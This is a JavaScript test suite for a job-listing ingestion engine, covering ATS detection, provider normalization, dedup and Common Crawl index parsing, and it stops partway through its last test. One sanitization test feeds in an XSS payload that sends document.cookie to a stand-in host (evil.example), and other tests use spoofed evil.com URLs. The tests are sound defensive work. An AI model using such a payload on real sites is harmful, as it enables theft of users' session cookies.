// Seen Job Ingestion engine — tests. Run: node --test lib/jobs/jobs.test.mjs
//
// Covers the non-negotiables: ATS detection + tenant extraction, employer-direct provider
// normalization with provenance, malicious-payload sanitization, multi-source canonical dedup
// (same vacancy → one employer-direct row; same title / different requisition → two), provider
// failure isolation, and Common Crawl CDX tenant parsing. No live network — providers take an
// injected fetch.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { detectAts, isAggregatorUrl, INGESTABLE_PROVIDERS } from './atsDetect.js';
import { greenhouse, lever, ashby, fetchSourceJobs } from './atsProviders.js';
import { fingerprint, dedupJobs } from './expand.js';
import {
  tenantsFromCdx, discoverFromCommonCrawl, surtPrefix, parseClusterLine, blocksForPrefix,
} from './discovery.js';
import { gzipSync } from 'node:zlib';
import { pageFor, summarizeAdzunaProbe } from '../../api/discover-sources.js';
import { dueSources } from './sourceRegistry.js';

// A fetch that returns the same JSON for any URL (single-call providers).
const mockFetch = (payload, { ok = true } = {}) => async () => ({ ok, json: async () => payload, text: async () => (typeof payload === 'string' ? payload : JSON.stringify(payload)) });

// ── ATS detection ─────────────────────────────────────────────────────────────
test('detectAts extracts provider + tenant from real ATS URLs', () => {
  const cases = [
    ['https://boards.greenhouse.io/target/jobs/123', 'greenhouse', 'target'],
    ['https://job-boards.greenhouse.io/stripe', 'greenhouse', 'stripe'],
    ['https://jobs.lever.co/netflix/abc-123', 'lever', 'netflix'],
    ['https://jobs.ashbyhq.com/linear/some-uuid', 'ashby', 'linear'],
    ['https://apply.workable.com/acme/', 'workable', 'acme'],
    ['https://careers.smartrecruiters.com/Bosch', 'smartrecruiters', 'bosch'],
    ['https://acme.recruitee.com/o/engineer', 'recruitee', 'acme'],
    ['https://tesla.wd1.myworkdayjobs.com/en-US/Tesla/job', 'workday', 'tesla'],
  ];
  for (const [url, provider, tenant] of cases) {
    const hit = detectAts(url);
    assert.ok(hit, `no detect for ${url}`);
    assert.equal(hit.provider, provider, `provider for ${url}`);
    assert.equal(hit.tenant, tenant, `tenant for ${url}`);
    assert.equal(hit.sourceType, 'ATS_DIRECT');
  }
  // ingestable flag: greenhouse yes, workday no (detected but not yet pulled directly)
  assert.equal(detectAts('https://boards.greenhouse.io/target').ingestable, true);
  assert.equal(detectAts('https://tesla.wd1.myworkdayjobs.com/Tesla').ingestable, false);
  assert.ok(INGESTABLE_PROVIDERS.has('greenhouse') && !INGESTABLE_PROVIDERS.has('workday'));
});

test('detectAts rejects non-ATS + reserved-word tenants, and flags aggregators', () => {
  assert.equal(detectAts('https://tesla.com/careers'), null);
  assert.equal(detectAts('https://www.google.com/search'), null);
  assert.equal(detectAts('not a url'), null);
  // SECURITY: a spoofed host must NEVER be mis-detected as an ATS (host is anchored, not substring).
  assert.equal(detectAts('https://boards.greenhouse.io.evil.com/target'), null, 'suffix-spoof host rejected');
  assert.equal(detectAts('https://evil.com/boards.greenhouse.io/target'), null, 'path-embedded host rejected');
  assert.equal(detectAts('https://evil.com/?x=jobs.lever.co/netflix'), null, 'query-embedded host rejected');
  // aggregator redirect URLs are NOT employer-direct
  assert.equal(isAggregatorUrl('https://www.adzuna.com/land/ad/123'), true);
  assert.equal(isAggregatorUrl('https://www.indeed.com/viewjob?jk=abc'), true);
  assert.equal(isAggregatorUrl('https://boards.greenhouse.io/target/jobs/1'), false);
});

// ── Provider normalization + provenance ────────────────────────────────────────
const DESC = 'Prevent theft and protect company assets. Conduct surveillance, write incident reports, and de-escalate difficult situations across the sales floor during every shift.';

test('Greenhouse provider normalizes to a canonical row with employer-direct provenance', async () => {
  const payload = { jobs: [{ id: 5001, title: 'Assets Protection Specialist', location: { name: 'Los Angeles, CA' }, absolute_url: 'https://boards.greenhouse.io/target/jobs/5001', content: `<p>${DESC}</p>` }] };
  const rows = await greenhouse.fetchCompanyJobs('target', { companyName: 'Target', fetchImpl: mockFetch(payload) });
  assert.equal(rows.length, 1);
  const r = rows[0];
  assert.equal(r.title, 'Assets Protection Specialist');
  assert.equal(r.company, 'Target');
  assert.equal(r.apply_url, 'https://boards.greenhouse.io/target/jobs/5001');
  assert.equal(r.source, 'Greenhouse');
  assert.equal(r.source_type, 'ATS_DIRECT');
  assert.equal(r.ats_provider, 'greenhouse');
  assert.equal(r.ats_tenant, 'target');
  assert.equal(r.external_id, '5001');
  assert.ok(r.description.length > 80 && !/[<>]/.test(r.description), 'description cleaned');
});

test('Lever + Ashby providers normalize from their real shapes', async () => {
  const lrows = await lever.fetchCompanyJobs('netflix', { companyName: 'Netflix', fetchImpl: mockFetch([
    { id: 'l-1', text: 'Software Engineer', categories: { location: 'Remote', commitment: 'Full-time' }, hostedUrl: 'https://jobs.lever.co/netflix/l-1', applyUrl: 'https://jobs.lever.co/netflix/l-1/apply', descriptionPlain: DESC },
  ]) });
  assert.equal(lrows.length, 1);
  assert.equal(lrows[0].ats_provider, 'lever');
  assert.equal(lrows[0].external_id, 'l-1');
  assert.equal(lrows[0].apply_url, 'https://jobs.lever.co/netflix/l-1/apply');

  const arows = await ashby.fetchCompanyJobs('linear', { companyName: 'Linear', fetchImpl: mockFetch({ jobs: [
    { id: 'a-9', title: 'Product Designer', location: 'San Francisco', isRemote: false, jobUrl: 'https://jobs.ashbyhq.com/linear/a-9', descriptionPlain: DESC, employmentType: 'FullTime' },
  ] }) });
  assert.equal(arows.length, 1);
  assert.equal(arows[0].ats_provider, 'ashby');
  assert.equal(arows[0].external_id, 'a-9');
});

// ── Malicious payload sanitization ─────────────────────────────────────────────
test('a malicious ATS description is sanitized (no script/HTML survives)', async () => {
  const evil = `<script>fetch('https://evil.example/'+document.cookie)</script>${DESC}<img src=x onerror=alert(1)>`;
  const rows = await greenhouse.fetchCompanyJobs('acme', { companyName: 'Acme', fetchImpl: mockFetch({ jobs: [{ id: 1, title: 'Engineer', location: { name: 'NY' }, absolute_url: 'https://boards.greenhouse.io/acme/jobs/1', content: evil }] }) });
  assert.equal(rows.length, 1);
  const d = rows[0].description;
  assert.ok(!/<script/i.test(d) && !/onerror/i.test(d) && !/[<>]/.test(d), `unsafe content survived: ${d}`);
});

// ── Multi-source canonical dedup ───────────────────────────────────────────────
test('dedup merges the same vacancy across sources but keeps distinct requisitions', () => {
  const gh = { title: 'Software Engineer', company: 'Acme', location: 'Los Angeles, CA', ats_provider: 'greenhouse', external_id: '100', apply_url: 'https://boards.greenhouse.io/acme/jobs/100' };
  const gh2 = { ...gh, external_id: '101', apply_url: 'https://boards.greenhouse.io/acme/jobs/101' };
  const adzunaDup = { title: 'Software Engineer', company: 'Acme', location: 'Los Angeles, CA', source: 'Adzuna', apply_url: 'https://adzuna.com/redirect/xyz' };

  // same vacancy from greenhouse + adzuna → ONE (employer-direct kept, aggregator dup dropped)
  const one = dedupJobs([gh, adzunaDup]);
  assert.equal(one.length, 1);
  assert.equal(one[0].ats_provider, 'greenhouse');

  // two greenhouse requisitions, same title/location → TWO
  const two = dedupJobs([gh, gh2]);
  assert.equal(two.length, 2);

  // both branches together → REQ-100, REQ-101, and the aggregator dup collapses into the reqs
  const all = dedupJobs([gh, gh2, adzunaDup]);
  assert.equal(all.length, 2);

  // two aggregator rows of the same job (no requisitions) → ONE
  assert.equal(dedupJobs([adzunaDup, { ...adzunaDup, apply_url: 'https://adzuna.com/redirect/abc' }]).length, 1);
});

test('fingerprint is case/whitespace-insensitive on title|company|location', () => {
  assert.equal(fingerprint({ title: ' Nurse ', company: 'HCA', location: 'Austin' }), fingerprint({ title: 'nurse', company: 'hca', location: 'austin' }));
});

// ── Provider failure isolation ─────────────────────────────────────────────────
test('a provider error is isolated — never throws, yields empty rows (circuit breaker sees no jobs)', async () => {
  const throwing = async () => { throw new Error('network down'); };
  // A network error is swallowed to empty rows (robust isolation) — it never throws, so one dead
  // provider can never break a multi-source fan-out. The cron treats empty rows as a soft failure,
  // so the circuit breaker still degrades a persistently-failing source.
  const r = await fetchSourceJobs({ provider: 'greenhouse', tenant: 'x', companyName: 'X' }, { fetchImpl: throwing });
  assert.ok(Array.isArray(r.rows) && r.rows.length === 0, 'network error → empty rows, no throw');
  // unknown provider → ok:false, no throw
  const u = await fetchSourceJobs({ provider: 'nope', tenant: 'x' });
  assert.equal(u.ok, false);
  assert.deepEqual(u.rows, []);
  // a non-ok HTTP response → empty rows, no throw
  const empty = await greenhouse.fetchCompanyJobs('x', { fetchImpl: mockFetch(null, { ok: false }) });
  assert.deepEqual(empty, []);
});

// ── Common Crawl CDX parsing ───────────────────────────────────────────────────
test('tenantsFromCdx extracts ingestable tenants from a CDX JSONL response', () => {
  const jsonl = [
    JSON.stringify({ url: 'https://boards.greenhouse.io/airbnb/jobs/42', status: '200' }),
    JSON.stringify({ url: 'https://jobs.lever.co/spotify', status: '200' }),
    JSON.stringify({ url: 'https://boards.greenhouse.io/airbnb/jobs/43', status: '200' }), // dup tenant
    JSON.stringify({ url: 'https://tesla.wd1.myworkdayjobs.com/x', status: '200' }), // workday → not ingestable, skipped
    JSON.stringify({ url: 'https://boards.greenhouse.io/dead/jobs/1', status: '404' }), // non-200 skipped
    'not json',
  ].join('\n');
  const tenants = tenantsFromCdx(jsonl);
  const keys = tenants.map((t) => `${t.provider}:${t.tenant}`).sort();
  assert.deepEqual(keys, ['greenhouse:airbnb', 'lever:spotify']);
});

// ── Common Crawl cc-index discovery sweep ──────────────────────────────────────
// THE CDX QUERY API IS GONE from this path. Measured from production 2026-08-13:
// index.commoncrawl.org/{crawl}-index?url=... returns HTTP 503 to Vercel on all seven patterns, while
// collinfo.json on that same host returns 200 in 21ms and the cc-index OBJECTS on data.commoncrawl.org
// Range-read fine (HTTP 206). A residential IP with the identical User-Agent gets 200 from the query
// API, so the UA is not the variable. Discovery therefore reads the index objects directly.
//
// These tests pin the object reader and — the part that matters more — that every way it can fail is
// REPORTED as a failure. Five silent-zero bugs in three days came from a failed read parsing to zero
// results and being labelled "found nothing".

const CRAWL = 'CC-MAIN-2026-30';
const toAB = (b) => b.buffer.slice(b.byteOffset, b.byteOffset + b.byteLength);

// Build a cluster.idx line exactly as Common Crawl serves it:
//   <key><SPACE><timestamp>\t<shard>\t<offset>\t<length>\t<cluster_id>
// The space is not cosmetic. A tab-split's field 0 is "key timestamp", so reading field 0 as the key
// breaks every ordering comparison the search depends on — verified against the real 99MB file.
const clusterIdx = (rows) =>
  rows.map((r, i) => `${r.key} ${r.ts || '20260714032627'}\t${r.shard}\t${r.offset}\t${r.length}\t${i + 1}`).join('\n') + '\n';

// Filler blocks that sort before/after the real ones. These exist to push cluster.idx past one scan
// window (64KB) so the ranged BINARY SEARCH actually bisects instead of the file fitting in one read.
const padKeys = (label, n) => Array.from({ length: n }, (_, i) => ({
  key: `${label},pad${String(i).padStart(6, '0')})/filler/path/segment`,
  shard: 'cdx-90000.gz', offset: 1000 + i * 500, length: 499,
}));
const padded = (rows) => clusterIdx([...padKeys('aaa', 1200), ...rows, ...padKeys('zzz', 1200)]);

// A native cc-index shard line: `key timestamp {json}` — NOT bare JSONL.
const shardLine = (url, status = '200') =>
  `${'io,example)/p'} 20260714032627 ${JSON.stringify({ url, status, mime: 'text/html' })}`;

// Serves collinfo.json, ranged cluster.idx reads (with content-range so the size is discoverable), and
// gzip shard blocks. Every failure mode the real bucket can produce is switchable.
function ccFetch({
  idxText, shards = {}, collinfo = [{ id: CRAWL }], delayMs = 0,
  failCollinfo = false, idxStatus = null, shardStatus = null, corruptShards = false,
} = {}) {
  const idx = Buffer.from(idxText || clusterIdx([]), 'utf8');
  const calls = [];
  const impl = async (url, opts = {}) => {
    const range = opts.headers?.Range || null;
    calls.push({ url, range });
    if (delayMs) await new Promise((r) => setTimeout(r, delayMs));
    if (url.includes('collinfo.json')) {
      return failCollinfo
        ? { ok: false, status: 503, text: async () => '' }
        : { ok: true, status: 200, text: async () => JSON.stringify(collinfo) };
    }
    const m = /bytes=(\d+)-(\d+)/.exec(range || '');
    const start = m ? Number(m[1]) : 0, end = m ? Number(m[2]) : 0;
    if (url.endsWith('cluster.idx')) {
      if (idxStatus) return { ok: false, status: idxStatus, arrayBuffer: async () => new ArrayBuffer(0) };
      const stop = Math.min(end, idx.length - 1);
      const slice = idx.subarray(start, stop + 1);
      return {
        ok: true, status: 206,
        headers: { get: (h) => (String(h).toLowerCase() === 'content-range' ? `bytes ${start}-${stop}/${idx.length}` : null) },
        arrayBuffer: async () => toAB(slice),
      };
    }
    if (shardStatus) return { ok: false, status: shardStatus, arrayBuffer: async () => new ArrayBuffer(0) };
    const name = url.split('/').pop();
    const jsonl = shards[`${name}@${start}`] ?? shards[name] ?? '';
    const body = corruptShards ? Buffer.from('this is definitely not a gzip member') : gzipSync(Buffer.from(jsonl, 'utf8'));
    return { ok: true, status: 206, headers: { get: () => null }, arrayBuffer: async () => toAB(body) };
  };
  impl.calls = calls;
  impl.shardCalls = () => calls.filter((c) => /cdx-\d+\.gz$/.test(c.url));
  impl.idxCalls = () => calls.filter((c) => c.url.endsWith('cluster.idx'));
  return impl;
}

// A single greenhouse block whose key is exactly the prefix, so it is the one covering block.
const ONE_GH_BLOCK = [{ key: 'io,greenhouse,boards)/', shard: 'cdx-00199.gz', offset: 4096, length: 512 }];

// ── SURT key derivation ────────────────────────────────────────────────────────
test('surtPrefix reverses the host into the cc-index key form', () => {
  assert.equal(surtPrefix('boards.greenhouse.io/*'), 'io,greenhouse,boards)/');
  assert.equal(surtPrefix('job-boards.greenhouse.io/*'), 'io,greenhouse,job-boards)/');
  assert.equal(surtPrefix('jobs.lever.co/*'), 'co,lever,jobs)/');
  assert.equal(surtPrefix('careers.smartrecruiters.com/*'), 'com,smartrecruiters,careers)/');
  // A leading-wildcard host cannot carry the path into the key: the label before it is unknown, so the
  // usable prefix stops at the domain and detectAts applies the /api/offers rule afterwards.
  assert.equal(surtPrefix('*.recruitee.com/api/offers*'), 'com,recruitee,');
  assert.equal(surtPrefix('https://apply.workable.com/*'), 'com,workable,apply)/');
  assert.equal(surtPrefix(''), null);
  assert.equal(surtPrefix('*/x'), null);
});

// ── cluster.idx line parsing ───────────────────────────────────────────────────
test('parseClusterLine splits the real cluster.idx shape, space and tabs both', () => {
  const line = 'io,greencubes)/robots.txt 20260720061138\tcdx-00199.gz\t546601778\t220724\t598984';
  assert.deepEqual(parseClusterLine(line), {
    key: 'io,greencubes)/robots.txt', timestamp: '20260720061138',
    shard: 'cdx-00199.gz', offset: 546601778, length: 220724,
  });
  // A key containing spaces (real: getro/utm URLs do) must split on the LAST space, not the first.
  const spaced = parseClusterLine('io,greenhouse,boards)/x?utm_source=sands capital job board 20260714132741\tcdx-00199.gz\t1\t2\t3');
  assert.equal(spaced.key, 'io,greenhouse,boards)/x?utm_source=sands capital job board');
  assert.equal(spaced.timestamp, '20260714132741');
  // Junk yields null rather than a bogus byte range.
  assert.equal(parseClusterLine(''), null);
  assert.equal(parseClusterLine('no tabs here'), null);
  assert.equal(parseClusterLine('k 1\tcdx-0.gz\tnotanumber\t5\t1'), null);
  assert.equal(parseClusterLine('k 1\tcdx-0.gz\t0\t0\t1'), null, 'a zero-length block is not a block');
});

// ── the sparse-index rule ──────────────────────────────────────────────────────
// cluster.idx gives the FIRST key of each block, so the block holding the START of a prefix range is
// the last one whose key is <= the prefix. Matching only startsWith would systematically drop the
// tenants at the front of every range — a silent, sorted-order bias, not a random loss.
test('blocksForPrefix includes the block the range starts INSIDE, not just startsWith matches', () => {
  const rows = [
    { key: 'io,greenaaa)/x', shard: 's', offset: 1, length: 1 },
    { key: 'io,greencubes)/robots.txt', shard: 's', offset: 2, length: 1 },   // <= prefix: range starts here
    { key: 'io,greenhouse,boards)/anduril/jobs/1', shard: 's', offset: 3, length: 1 },
    { key: 'io,greenhouse,boards)/zapier/jobs/9', shard: 's', offset: 4, length: 1 },
    { key: 'io,greenhouse,eu,job-boards)/groww', shard: 's', offset: 5, length: 1 }, // past the range
    { key: 'zz,later)/x', shard: 's', offset: 6, length: 1 },
  ];
  assert.deepEqual(blocksForPrefix(rows, 'io,greenhouse,boards)/').map((b) => b.offset), [2, 3, 4]);
  // A prefix absent from the index yields only the straddling candidate, never the whole file.
  assert.deepEqual(blocksForPrefix(rows, 'io,nothinghere)/').map((b) => b.offset), [5]);
});

// ── (a) cluster.idx → the right shard and byte range ───────────────────────────
test('cluster.idx parsing picks the correct shard and byte range for a known prefix', async () => {
  // Real offsets/lengths lifted from CC-MAIN-2026-30 so the arithmetic is checked against live values.
  const f = ccFetch({
    idxText: padded([
      { key: 'io,greencubes)/robots.txt', shard: 'cdx-00199.gz', offset: 546601778, length: 220724 },
      { key: 'io,greenhouse,boards)/andurilindustries/jobs/1', shard: 'cdx-00199.gz', offset: 546822502, length: 206968 },
      { key: 'io,greenhouse,eu,job-boards)/groww/jobs/1', shard: 'cdx-00199.gz', offset: 547674186, length: 228218 },
    ]),
  });
  await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'], maxBlocksPerPattern: 10 });

  // Range is offset .. offset+length-1, inclusive — the form the bucket answers 206 to.
  assert.deepEqual(f.shardCalls().map((c) => c.range), [
    'bytes=546601778-546822501',
    'bytes=546822502-547029469',
  ]);
  assert.ok(f.shardCalls().every((c) => c.url === `https://data.commoncrawl.org/cc-index/collections/${CRAWL}/indexes/cdx-00199.gz`),
    f.shardCalls().map((c) => c.url).join(' '));
  // The block past the prefix range must not be fetched.
  assert.ok(!f.shardCalls().some((c) => c.range.startsWith('bytes=547674186')), 'read a block outside the prefix range');

  // And it BISECTED: a 99MB index cannot be downloaded, so every cluster.idx read must be ranged.
  assert.ok(f.idxCalls().length > 1, 'expected a ranged binary search, not one read');
  assert.ok(f.idxCalls().every((c) => /^bytes=\d+-\d+$/.test(c.range)), 'every index read must be ranged');
});

// ── (b) a gzip shard block → tenants, via the unchanged extractor ──────────────
test('a gzip shard block parses into tenants through the existing extractor', async () => {
  const body = [
    shardLine('https://boards.greenhouse.io/airbnb/jobs/42'),
    shardLine('https://jobs.lever.co/spotify'),
    shardLine('https://boards.greenhouse.io/airbnb/jobs/43'),        // duplicate tenant
    shardLine('https://tesla.wd1.myworkdayjobs.com/x'),              // workday → not ingestable
    shardLine('https://boards.greenhouse.io/dead/jobs/1', '404'),    // the status filter still applies
  ].join('\n');
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), shards: { 'cdx-00199.gz@4096': body } });
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'] });

  assert.equal(out.discovered, 2, 'airbnb + spotify, deduped, workday and the 404 excluded');
  assert.equal(out.shards_read, 1);
  assert.ok(out.bytes_read > 0, 'bytes_read must account for what was pulled');
  assert.deepEqual(out.pattern_errors, []);
  assert.equal(out.truncated, false);
});

test('tenantsFromCdx reads the native cc-index shard shape as well as bare JSONL', () => {
  const native = [shardLine('https://boards.greenhouse.io/figma'), shardLine('https://jobs.lever.co/plaid', '301')].join('\n');
  assert.deepEqual(tenantsFromCdx(native).map((t) => `${t.provider}:${t.tenant}`), ['greenhouse:figma']);
});

// ── (c) a refused cluster.idx is UNRESOLVED, not empty ─────────────────────────
// The exact mislabel this whole file guards: a non-2xx parses to zero tenants, and reporting that as
// no_tenants is a lie the reader cannot detect. It sent two people chasing latency and starvation
// theories for a sweep the server was rejecting outright.
test('a non-200 on cluster.idx is cc_index_error with the status, never no_tenants', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), idxStatus: 503 });
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*', 'jobs.lever.co/*'] });

  assert.equal(out.discovered, 0);
  assert.notEqual(out.reason, 'no_tenants', 'a 503 must never be labelled no_tenants');
  assert.equal(out.reason, 'cc_index_error');
  assert.match(out.detail, /http_503/);
  assert.equal(out.pattern_errors.length, 2);
  assert.ok(out.pattern_errors.every((e) => e.includes('cluster_idx') && e.includes('http_503')), out.pattern_errors.join(' | '));
  assert.equal(out.patterns_swept, 2, 'a refused pattern was still attempted');
  assert.equal(out.shards_read, 0);
});

// ── (d) a refused shard byte range is reported ─────────────────────────────────
test('a non-200 on a shard byte range is reported, not silently dropped', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), shardStatus: 416 });
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'] });

  assert.equal(out.discovered, 0);
  assert.notEqual(out.reason, 'no_tenants');
  assert.equal(out.reason, 'cc_index_error');
  assert.match(out.detail, /http_416/);
  assert.ok(out.pattern_errors.some((e) => e.includes('shard') && e.includes('cdx-00199.gz')), out.pattern_errors.join(' | '));
  assert.equal(out.shards_read, 0, 'a block that never arrived was not read');
});

// ── (e) a block that will not inflate is reported ──────────────────────────────
test('a gunzip failure is reported as an error, never read as an empty block', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), corruptShards: true });
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'] });

  assert.equal(out.discovered, 0);
  assert.notEqual(out.reason, 'no_tenants');
  assert.equal(out.reason, 'cc_index_error');
  assert.match(out.detail, /gunzip_error/);
  assert.ok(out.bytes_read > 0, 'the bytes arrived even though they would not inflate');
});

// ── a zero must always explain itself ──────────────────────────────────────────
test('no_tenants requires a clean AND complete read of every attempted pattern', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), shards: { 'cdx-00199.gz@4096': shardLine('https://example.com/careers') } });
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'] });
  assert.equal(out.reason, 'no_tenants');
  assert.deepEqual(out.pattern_errors, []);
  assert.equal(out.truncated, false);
  assert.equal(out.shards_read, 1, 'a real block was read and genuinely held no ingestable tenant');
  assert.equal(out.detail, null);
});

// A run stopped by its own byte cap read LESS of the index than exists. Reporting that as no_tenants
// would let a truncated run masquerade as an exhausted one — which is why shards_read/bytes_read and
// `truncated` are in the summary at all.
test('a run cut short by the byte cap reports truncated, not no_tenants', async () => {
  const f = ccFetch({
    idxText: padded([{ key: 'io,greenhouse,boards)/', shard: 'cdx-00199.gz', offset: 0, length: 5_000_000 }]),
  });
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'], maxBytes: 1_000_000 });
  assert.equal(out.discovered, 0);
  assert.notEqual(out.reason, 'no_tenants');
  assert.equal(out.reason, 'truncated');
  assert.equal(out.truncated, true);
  assert.equal(out.shards_read, 0);
  assert.match(out.detail, /stopped early/);
  // "1 available, 0 read" is the pair that makes a budget-truncated run legible. Without it this run
  // and a genuinely empty prefix report the same tenant count.
  assert.equal(out.pattern_blocks['boards.greenhouse.io/*'], '1->0@0');
});

// Absence cannot be read off cluster.idx directly, because it is SPARSE: a prefix that sorts past every
// indexed key still falls INSIDE the last block, and the only way to establish it is not there is to
// read that block. So "1 block available, 1 read, 0 tenants" is the honest answer here, and a walk that
// ran to end-of-file is COMPLETE — reaching EOF is not the same as being cut off by a cap.
test('a prefix sorting past every indexed key still probes the one block that could hold it', async () => {
  const f = ccFetch({ idxText: clusterIdx(padKeys('aaa', 1200)) });
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'] });
  assert.equal(out.pattern_blocks['boards.greenhouse.io/*'], '1->1@0');
  assert.equal(out.shards_read, 1);
  assert.equal(out.truncated, false, 'reaching EOF is a complete walk, not a truncated one');
  assert.equal(out.reason, 'no_tenants', 'a complete read that genuinely found nothing is a real zero');
});

// ── rotation over blocks ───────────────────────────────────────────────────────
// `page` used to be a CDX page cursor, and #273 walked it off the end of a one-page index so every
// request 400ed for hours. There is no cursor now, but the clamp survives: an offset past the end of
// what exists is the bug, whatever the offset indexes.
test('the rotation hint is clamped to the blocks that exist and never re-reads one in a run', async () => {
  const rows = [
    { key: 'io,greenhouse,boards)/', shard: 'cdx-00199.gz', offset: 1000, length: 100 },
    { key: 'io,greenhouse,boards)/b', shard: 'cdx-00199.gz', offset: 2000, length: 100 },
    { key: 'io,greenhouse,boards)/c', shard: 'cdx-00199.gz', offset: 3000, length: 100 },
  ];
  for (const [page, firstOffset] of [[0, 1000], [1, 2000], [2, 3000], [3, 1000], [37, 2000]]) {
    const f = ccFetch({ idxText: padded(rows) });
    const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'], maxBlocksPerPattern: 2, page });
    const ranges = f.shardCalls().map((c) => c.range);
    assert.equal(ranges.length, 2, `page=${page} read ${ranges.length} blocks`);
    assert.equal(new Set(ranges).size, 2, `page=${page} re-read a block inside one run`);
    assert.equal(ranges[0], `bytes=${firstOffset}-${firstOffset + 99}`, `page=${page} started at the wrong block`);
    assert.equal(out.pattern_blocks['boards.greenhouse.io/*'], `3->2@${page % 3}`);
  }
});

test('asking for more blocks than exist reads each exactly once', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK) });
  await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'], maxBlocksPerPattern: 50, page: 7 });
  assert.equal(f.shardCalls().length, 1);
});

// ── budget + registry bookkeeping ──────────────────────────────────────────────
test('discoverFromCommonCrawl reports no_crawl_id when the collection index is unreachable', async () => {
  const out = await discoverFromCommonCrawl({ fetchImpl: ccFetch({ failCollinfo: true }) });
  assert.equal(out.reason, 'no_crawl_id');
  assert.equal(out.crawl, null);
  assert.equal(out.patterns_swept, 0, 'must not sweep any pattern without a crawl id');
});

test('discoverFromCommonCrawl reports WHY the crawl id could not be read', async () => {
  const http503 = await discoverFromCommonCrawl({ fetchImpl: async () => ({ ok: false, status: 503, text: async () => '' }) });
  assert.equal(http503.reason, 'no_crawl_id');
  assert.equal(http503.detail, 'http_503');

  const htmlBody = await discoverFromCommonCrawl({ fetchImpl: async () => ({ ok: true, status: 200, text: async () => '<html>blocked by proxy</html>' }) });
  assert.equal(htmlBody.reason, 'no_crawl_id');
  assert.match(htmlBody.detail, /^parse_error: /);

  const wrongShape = await discoverFromCommonCrawl({ fetchImpl: async () => ({ ok: true, status: 200, text: async () => '{"collections":[]}' }) });
  assert.equal(wrongShape.reason, 'no_crawl_id');
  assert.match(wrongShape.detail, /^unexpected_shape: /);

  const threw = await discoverFromCommonCrawl({
    fetchImpl: async () => { const e = new Error('connect ECONNREFUSED'); e.name = 'FetchError'; throw e; },
  });
  assert.equal(threw.reason, 'no_crawl_id');
  assert.match(threw.detail, /^FetchError: /);
});

test('the crawl id is read from collinfo.json and used in every object URL', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), collinfo: [{ id: 'CC-MAIN-2026-33' }] });
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'] });
  assert.equal(out.crawl, 'CC-MAIN-2026-33');
  assert.ok(f.idxCalls().every((c) => c.url.includes('/CC-MAIN-2026-33/indexes/cluster.idx')), 'crawl id not threaded into the index URL');
  assert.ok(f.shardCalls().every((c) => c.url.includes('/CC-MAIN-2026-33/indexes/')));
});

test('discoverFromCommonCrawl stops at the deadline instead of sweeping every pattern', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), delayMs: 20 });
  const patterns = ['boards.greenhouse.io/*', 'jobs.lever.co/*', 'jobs.ashbyhq.com/*', 'apply.workable.com/*', 'careers.smartrecruiters.com/*'];
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns, deadline: Date.now() + 60 });
  assert.equal(out.reason, 'deadline');
  assert.ok(out.patterns_swept < patterns.length, `swept ${out.patterns_swept}/${patterns.length} — deadline ignored`);
  assert.equal(out.patterns_total, patterns.length);
});

test('a pattern skipped for budget is reported as skipped, not as swept-and-empty', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), delayMs: 20 });
  const patterns = ['a.com/*', 'b.com/*', 'c.com/*', 'd.com/*', 'e.com/*', 'f.com/*'];
  const out = await discoverFromCommonCrawl({ fetchImpl: f, patterns, concurrency: 2, deadline: Date.now() + 60 });
  assert.equal(out.reason, 'deadline');
  assert.ok(out.patterns_swept < patterns.length, `swept ${out.patterns_swept}/${patterns.length} — deadline ignored`);
  assert.equal(out.patterns_total, patterns.length);
});

test('discoverFromCommonCrawl sweeps patterns concurrently, not serially', async () => {
  let inFlight = 0, peak = 0;
  const base = ccFetch({ idxText: padded(ONE_GH_BLOCK) });
  const fetchImpl = async (url, opts) => {
    if (url.includes('collinfo.json')) return base(url, opts);
    inFlight++; peak = Math.max(peak, inFlight);
    await new Promise((r) => setTimeout(r, 5));
    inFlight--;
    return base(url, opts);
  };
  const patterns = ['a.com/*', 'b.com/*', 'c.com/*', 'd.com/*', 'e.com/*', 'f.com/*', 'g.com/*'];
  const out = await discoverFromCommonCrawl({ fetchImpl, patterns, concurrency: 4 });
  assert.equal(out.patterns_swept, 7, 'every pattern should be swept');
  assert.ok(peak > 1, `patterns ran serially (peak in-flight ${peak})`);
  assert.ok(peak <= 4, `concurrency cap exceeded (peak in-flight ${peak})`);
});

test('discoverFromCommonCrawl counts only genuinely new boards, not re-upserted known ones', async () => {
  const body = [shardLine('https://boards.greenhouse.io/airbnb/jobs/1'), shardLine('https://boards.greenhouse.io/stripe/jobs/2')].join('\n');
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), shards: { 'cdx-00199.gz@4096': body } });
  const registered = [];
  const out = await discoverFromCommonCrawl({
    fetchImpl: f, patterns: ['boards.greenhouse.io/*'],
    supabaseUrl: 'https://db.test', serviceKey: 'k',
    existingKeysImpl: async () => new Set(['greenhouse|airbnb']),
    registerImpl: async (e) => { registered.push(`${e.provider}|${e.tenant}`); return true; },
  });
  assert.equal(out.discovered, 2, 'both tenants seen');
